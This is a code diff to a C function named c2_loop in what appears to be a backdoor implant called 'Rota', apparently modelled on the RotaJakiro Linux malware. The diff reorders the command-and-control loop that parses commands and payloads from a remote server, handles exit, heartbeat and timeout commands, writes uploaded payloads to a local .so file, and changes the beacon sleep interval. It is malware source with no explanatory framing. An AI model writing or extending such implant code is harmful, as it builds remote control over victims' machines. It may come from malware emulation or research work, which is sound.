@@ -27,7 +27,7 @@ void c2_loop() {
     char *cmd_id = NULL;
     int payload_length;
 
-    int sleepy_time = 3; // default C2 sleep time
+    int sleepy_time = 5; // default C2 sleep time
     int sock;
     int sock2;
     bool first_pkt = true;
@@ -87,6 +87,7 @@ void c2_loop() {
         char *initial_pkt = initial_rota_pkt();
         send(sock, initial_pkt, 82, 0);
     }
+
     // interactive c2 loop
     #ifdef DEBUG
         printf("\n(%d) In c2 loop...\n", getpid());
@@ -94,14 +95,33 @@ void c2_loop() {
 
         memset(buffer, 0, maxlen);
 
-
-// get all data from the sending buffers
+     // get all data from the sending buffers
     while ((n = recv(sock, buffer, maxlen, 0)) > 0) {
+
         // checkin packet has been sent, close sockets.
-        close(sock);
         shutdown(sock, 2);
+        close(sock);
+
         maxlen -= n;
         len += n;
+
+        cmd_id = parse_c2_cmdid(buffer);
+        if (!cmd_id) {
+            break;
+        }
+        // get payload length
+        payload_length = parse_c2_payload_len(buffer);
+        char *payload = parse_c2_payload(buffer, payload_length);
+
+        #ifdef DEBUG
+        printf("Timeout is %d\n", sleepy_time);
+        printf("Payload is %s\n", payload);
+        printf("Payload length is %d\n", payload_length);
+        #endif
+        if (memcmp(&rota_c2_heartbeat, cmd_id, 4) == 0) {
+            // prevent dual heart beats
+            break;
+        }
 
         // create new socket to send response based on parsed data.
         if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
@@ -120,33 +140,13 @@ void c2_loop() {
             c2_loop();
         }
 
-        cmd_id = parse_c2_cmdid(buffer);
-        if (!cmd_id) {
-            break;
-        }
-        // get payload length
-        payload_length = parse_c2_payload_len(buffer);
-        char *payload = parse_c2_payload(buffer, payload_length);
-
-        #ifdef DEBUG
-        printf("Timeout is %d\n", sleepy_time);
-        printf("Payload is %s\n", payload);
-        printf("Payload length is %d\n", payload_length);
-        #endif
-
         if (memcmp(&rota_c2_exit, cmd_id, 4) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 Run exiting!\n");
             #endif
             c2_exit(cmd_id, sock2);
             exit(0);
-        }
-        else if (memcmp(&rota_c2_heartbeat, cmd_id, 4) == 0) {
-            c2_heartbeat(cmd_id, sock2);
-            break;
-
-        }
-        else if (memcmp(&rota_c2_set_timeout, cmd_id, 4) == 0) {
+        } else if (memcmp(&rota_c2_set_timeout, cmd_id, 4) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 set timeout!\n");
             #endif
@@ -206,7 +206,6 @@ void c2_loop() {
             printf("[+] Rota C2 upload file \n");
             #endif
 
-            // TODO - break this out into a stub function
             FILE *fd = fopen("local_rota_file.so", "w+");
             int res = fwrite(payload, sizeof(payload[0]), payload_length, fd);
             fclose(fd);
@@ -285,29 +284,18 @@ void c2_loop() {
             #endif
         }
 
-        sleep(sleepy_time);
         free(payload);
         free(cmd_id);
         memset(buffer, 0, strlen(buffer));
-        shutdown(sock, 2);
-        close(sock);
-
         shutdown(sock2, 2);
         close(sock2);
 
     }
-
-        memset(buffer, 0, strlen(buffer));
         sleep(sleepy_time);
-        shutdown(sock, 2);
+        memset(buffer, 0, strlen(buffer));
         shutdown(sock2, 2);
-        close(sock);
         close(sock2);
     }
 
-    shutdown(sock, 2);
-    shutdown(sock2, 2);
-    close(sock);
-    close(sock2);
     exit(0);
 }
